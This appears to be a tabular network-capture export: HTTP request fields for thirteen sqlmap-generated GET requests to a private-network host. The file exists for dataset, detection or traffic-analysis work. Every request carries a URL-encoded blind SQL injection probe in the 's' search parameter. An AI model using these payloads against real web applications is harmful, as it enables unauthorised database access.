http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%20AND%209996%3D9504%20AND%20%28%28%27QVNt%27%3D%27QVNt		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%20AND%209996%3D9504%20AND%20%28%28%27QVNt%27%3D%27QVNt
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%20AND%207877%3D7877%20AND%20%28%28%27XRDE%27%3D%27XRDE		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%20AND%207877%3D7877%20AND%20%28%28%27XRDE%27%3D%27XRDE
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%20AND%201380%3D8214%20AND%20%28%28%27WeAm%27%3D%27WeAm		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%20AND%201380%3D8214%20AND%20%28%28%27WeAm%27%3D%27WeAm
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%29%20AND%208621%3D1822%20AND%20%28%28%28%27ClQo%27%3D%27ClQo		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%29%20AND%208621%3D1822%20AND%20%28%28%28%27ClQo%27%3D%27ClQo
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%29%20AND%207877%3D7877%20AND%20%28%28%28%27UEHv%27%3D%27UEHv		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%29%20AND%207877%3D7877%20AND%20%28%28%28%27UEHv%27%3D%27UEHv
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%29%20AND%202392%3D3541%20AND%20%28%28%28%27TAeV%27%3D%27TAeV		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%29%20AND%202392%3D3541%20AND%20%28%28%28%27TAeV%27%3D%27TAeV
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%209123%3D8824%20AND%20%27EHoS%27%3D%27EHoS		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%209123%3D8824%20AND%20%27EHoS%27%3D%27EHoS
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%207877%3D7877%20AND%20%27sjEU%27%3D%27sjEU		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%207877%3D7877%20AND%20%27sjEU%27%3D%27sjEU
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%20AND%203920%3D2645%20AND%20%27jXEM%27%3D%27jXEM		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%20AND%203920%3D2645%20AND%20%27jXEM%27%3D%27jXEM
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%20AND%203692%3D5821%20AND%20%28%27TxNn%27%20LIKE%20%27TxNn		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%20AND%203692%3D5821%20AND%20%28%27TxNn%27%20LIKE%20%27TxNn
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%20AND%207877%3D7877%20AND%20%28%27ScGq%27%20LIKE%20%27ScGq		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%20AND%207877%3D7877%20AND%20%28%27ScGq%27%20LIKE%20%27ScGq
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%20AND%208621%3D3545%20AND%20%28%27UBcW%27%20LIKE%20%27UBcW		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%20AND%208621%3D3545%20AND%20%28%27UBcW%27%20LIKE%20%27UBcW
*/*	gzip,deflate										no-cache						close										192.168.1.102														http://192.168.1.102:80/web/	1	http://192.168.1.102/web/?s=qZuJ%27%29%29%20AND%205852%3D7904%20AND%20%28%28%27DXJr%27%20LIKE%20%27DXJr		GET				HTTP/1.1																			sqlmap/1.5.9#stable (http://sqlmap.org)				/web/?s=qZuJ%27%29%29%20AND%205852%3D7904%20AND%20%28%28%27DXJr%27%20LIKE%20%27DXJr
